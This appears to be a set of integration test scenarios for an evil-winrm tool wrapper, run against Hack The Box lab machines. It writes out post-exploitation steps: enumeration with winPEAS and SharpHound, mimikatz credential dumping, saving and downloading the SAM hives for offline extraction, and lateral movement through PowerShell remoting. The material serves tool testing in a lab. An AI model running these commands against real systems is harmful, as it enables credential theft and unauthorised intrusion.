# Integration Scenarios: evil-winrm
# Required HTB Machines: Any Windows box with WinRM (5985) open
#   Recommended: Pirate, Garfield, Fries, Eighteen, Eloquent, DarkZero, Overwatch
# Prerequisites: Valid Windows credentials (username + password or NTLM hash),
#                target reachable on VPN, WinRM port 5985 open
# Run with: pytest tests/tools/test_evil_winrm.py --tool=evil-winrm \
#           --target=<IP> --username=<USER> --password=<PASS> \
#           -m integration -v
#
# Recommended HTB box: Certified (medium, AD, WinRM open, has CLM on some accounts,
#   supports NTLM and Kerberos auth, multiple users with different privilege levels)
#   Alternatives: Pirate (insane, gMSA + Kerberos-only paths, NTLM disabled segments),
#                 Hercules (insane, NTLM disabled — Kerberos mandatory)
#
# 3 methods: exec, upload, download
# 31.9% error rate in engagement data (1707 calls) — error scenarios are critical

## Scenario 51: Full exploitation workflow
Steps:
  1. exec: whoami (verify access)
  2. exec: ipconfig /all (network info)
  3. upload: /session/artifacts/winPEAS.exe -> C:\Windows\Temp\wp.exe
  4. exec: C:\Windows\Temp\wp.exe (run enumeration)
  5. download: C:\Users\<USER>\Desktop\user.txt (get flag)
Expected: All steps succeed, no state issues between calls
Notes: Tests that multiple sequential calls work correctly. Each call creates
  a new PSRP connection (no session reuse between MCP calls).

## Scenario 52: Post-exploitation enumeration chain
Steps:
  1. exec: net user (local users)
  2. exec: net localgroup administrators (admin group members)
  3. exec: netstat -an (network connections)
  4. exec: Get-Service | Where-Object {$_.Status -eq 'Running'} (running services)
  5. exec: Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} (scheduled tasks)
  6. exec: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr /i "displayname" (installed software)
Expected: All succeed, good enumeration data
Notes: Common post-exploitation enumeration commands.

## Scenario 53: Upload and execute workflow
Steps:
  1. upload: /session/artifacts/SharpHound.exe -> C:\Windows\Temp\sh.exe
  2. exec: C:\Windows\Temp\sh.exe -c All --zipfilename bloodhound.zip
  3. exec: Get-ChildItem C:\Windows\Temp\*bloodhound*.zip (find output)
  4. download: C:\Windows\Temp\<timestamp>_bloodhound.zip
Expected: Upload succeeds, execution produces output, download gets results
Notes: Classic BloodHound collection workflow.

## Scenario 54: Credential extraction workflow
Steps:
  1. exec: whoami /priv (check SeDebugPrivilege)
  2. upload: /session/artifacts/mimikatz.exe -> C:\Windows\Temp\m.exe
  3. exec: C:\Windows\Temp\m.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
  4. Parse output for NTLM hashes and plaintext passwords
Expected: Requires admin + SeDebugPrivilege for logonpasswords
Notes: Classic mimikatz credential dump. Alternative: procdump LSASS then offline extraction.

## Scenario 55: SAM dump via reg save + download
Steps:
  1. exec (cmd): reg save HKLM\SAM C:\Windows\Temp\sam
  2. exec (cmd): reg save HKLM\SYSTEM C:\Windows\Temp\system
  3. exec (cmd): reg save HKLM\SECURITY C:\Windows\Temp\security
  4. download: C:\Windows\Temp\sam -> /session/artifacts/sam
  5. download: C:\Windows\Temp\system -> /session/artifacts/system
  6. download: C:\Windows\Temp\security -> /session/artifacts/security
  7. exec (cmd): del C:\Windows\Temp\sam C:\Windows\Temp\system C:\Windows\Temp\security
Expected: All succeed, three hive files downloaded for offline extraction
Notes: Alternative to in-memory SAM dump. Files can be processed with
  impacket secretsdump -sam sam -system system -security security LOCAL

## Scenario 56: Lateral movement via PS remoting (double-hop)
Method: exec
Args: {target: <IP>, username: <USER>, password: <PASS>, command: "Invoke-Command -ComputerName <INTERNAL_HOST> -ScriptBlock { whoami }"}
Expected: isError=true (double-hop / logon session failure)
Notes: From engagement data (Pirate): 11 failures with "logon session does not exist".
  This is the Kerberos double-hop problem — WinRM session can't delegate to a third host.
  Fix: Use CredSSP, resource-based constrained delegation, or get a TGT on the target.
HTB Machines: Pirate

## Scenario 57: Lateral movement via PS remoting with credential delegation
Method: exec
Args: {target: <IP>, username: <USER>, password: <PASS>, command: "$secpw = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\\<USER>', $secpw); Invoke-Command -ComputerName <INTERNAL_HOST> -Credential $cred -ScriptBlock { whoami }"}
Expected: May succeed if CredSSP/delegation is configured, otherwise double-hop failure
Notes: Explicitly passing credentials can sometimes work around double-hop.
  More reliable: use impacket directly against the internal host.
